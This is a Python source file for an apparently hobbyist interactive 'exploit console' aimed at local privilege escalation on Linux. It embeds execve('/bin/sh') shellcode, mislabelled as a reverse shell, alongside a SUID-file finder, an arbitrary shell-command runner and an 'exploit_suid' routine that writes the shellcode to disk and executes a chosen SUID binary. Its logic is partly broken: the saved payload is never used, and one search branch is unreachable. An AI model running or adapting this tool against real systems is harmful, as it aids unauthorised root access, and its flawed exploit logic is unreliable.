import cmd
import subprocess
import os
import pty
import sys
import tty
import termios

# Definindo cores
green = "\x1b[92m"
red = "\x1b[91m"
yellow = "\x1b[93m"
reset = "\x1b[0m"

def print_banner():
    print(f"""{red}
        ██▀███   ▒█████   ▄▄▄      ▒██   ██▒▒██   ██▒
        ▓██ ▒ ██▒▒██▒  ██▒▒████▄    ▒▒ █ █ ▒░▒▒ █ █ ▒░
        ▓██ ░▄█ ▒▒██░  ██▒▒██  ▀█▄  ░░  █   ░░░  █   ░
        ▒██▀▀█▄  ▒██   ██░░██▄▄▄▄██  ░ █ █ ▒  ░ █ █ ▒
        ░██▓ ▒██▒░ ████▓▒░ ▓█   ▓██▒▒██▒ ▒██▒▒██▒ ▒██▒
        ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ▒▒   ▓▒█░▒▒ ░ ░▓ ░▒▒ ░ ░▓ ░
        ░▒ ░ ▒░  ░ ▒ ▒░   ▒   ▒▒ ░░░   ░▒ ░░░   ░▒ ░
        ░░   ░ ░ ░ ░ ▒    ░   ▒    ░    ░   ░    ░
        ░         ░ ░        ░  ░ ░    ░   ░    ░
                                            by: wh0is.{reset}\n""")

class ExploitConsole(cmd.Cmd):
    intro = f"{yellow}   welcome to the roaxx-console. type help or ? to list commands.{reset}\n"
    prompt = f"{yellow}(exploit) {reset}"
    file = None

    def __init__(self):
        super().__init__()
        print_banner()
        self.payloads = {
            'shell': b"\x48\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x3b\x0f\x05",
            'reverse_shell': b"\x48\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x3b\x0f\x05"
        }
        self.current_payload = self.payloads['shell']
        self.payload_path = None  # Inicializa o caminho do payload

    def do_set_payload(self, arg):
        'define the payload to use: set_payload <payload_name>'
        if arg in self.payloads:
            self.current_payload = self.payloads[arg]
            print(f"{green}[+] payload set to {arg}.{reset}")
        else:
            print(f"{red}[!] invalid payload name.{reset}")

    def do_list_payloads(self, arg):
        'list available payloads'
        print(f"{yellow}[*] available payloads:{reset}")
        for name in self.payloads:
            print(name)

    def do_set_payload_path(self, path):
        'set the path for saving the payload: set_payload_path <path>'
        if not path:
            print(f"{red}[!] path cannot be empty.{reset}")
            return
        self.payload_path = path
        print(f"{green}[+] payload path set to {path}.{reset}")

    def do_save_payload(self, filename):
        'save the current payload to a file: save_payload <filename>'
        if not filename:
            print(f"{red}[!] filename cannot be empty.{reset}")
            return
        try:
            with open(filename, "wb") as f:
                f.write(self.current_payload)
            print(f"{green}[+] payload saved to {filename}.{reset}")
        except IOError as e:
            print(f"{red}[!] error saving payload: {e}.{reset}")

    def do_execute_command(self, command):
        'execute a shell command: execute_command <command>'
        if not command:
            print(f"{red}[!] command cannot be empty.{reset}")
            return
        try:
            print(f"{yellow}[*] executing command: {command}{reset}")
            result = subprocess.run(command, check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            print(result.stdout)
            if result.stderr:
                print(f"{red}[!] standard error: {result.stderr}{reset}")
            print(f"{green}[+] command executed successfully.{reset}")
        except subprocess.CalledProcessError as e:
            print(f"{red}[!] error executing command: {e}{reset}")

    def do_find_suid_files(self, arg):
        'find SUID files'
        print(f"{yellow}[*] looking for SUID files...{reset}")
        try:
            result = subprocess.check_output("find /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null", shell=True, text=True)
            if result:
                suid_files = result.splitlines()
                print(f"{green}[+] suid files found!{reset}")
                for file in suid_files:
                    print(file)
            elif result is None:
                result = subprocess.check_output("ls -l /bin /sbin /usr/bin /usr/sbin 2>/dev/null | grep '^rws'", shell=True, text=True)
                print(f"{yellow}[*] looking for other SUIDs...{reset}")
                suid_files = result.splitlines()
                for file in suid_files:
                    print(file)
            else:
                print(f"{red}[!] no suid files found.{reset}")
        except subprocess.CalledProcessError as e:
            print(f"{red}[!] error executing find command: {e}{reset}")

    def do_exploit_suid(self, filepath):
        'exploit a SUID file'
        print(f"{yellow}[*] trying exploit with: {filepath}{reset}")

        if not self.payload_path:
            print(f"{red}[!] payload path not set. Use set_payload_path to define it.{reset}")
            return

        payload_path = self.payload_path
        try:
            with open(payload_path, "wb") as f:
                f.write(self.current_payload)
            print(f"{yellow}\n[*] payload saved to: {payload_path}{reset}")
        except IOError as e:
            print(f"{red}\n[!] error saving payload: {e}.{reset}")
            return

        # Use pty to create an interactive shell
        print(f"{yellow}\n[*] executing exploit...{reset}")
        try:
            master, slave = pty.openpty()
            pid = os.fork()
            if pid == 0:
                os.close(master)
                os.execv(filepath, [filepath])
            else:
                os.close(slave)
                while True:
                    try:
                        output = os.read(master, 1024).decode()
                        if output:
                            sys.stdout.write(output)
                            sys.stdout.flush()
                        else:
                            break
                    except OSError:
                        break
        except Exception as e:
            print(f"{red}\n   [!] error executing exploit: {e}{reset}")

    def do_quit(self, arg):
        'exit the console'
        print(f"{green}\n   [+] exiting...{reset}")
        return True

if __name__ == '__main__':
    ExploitConsole().cmdloop()
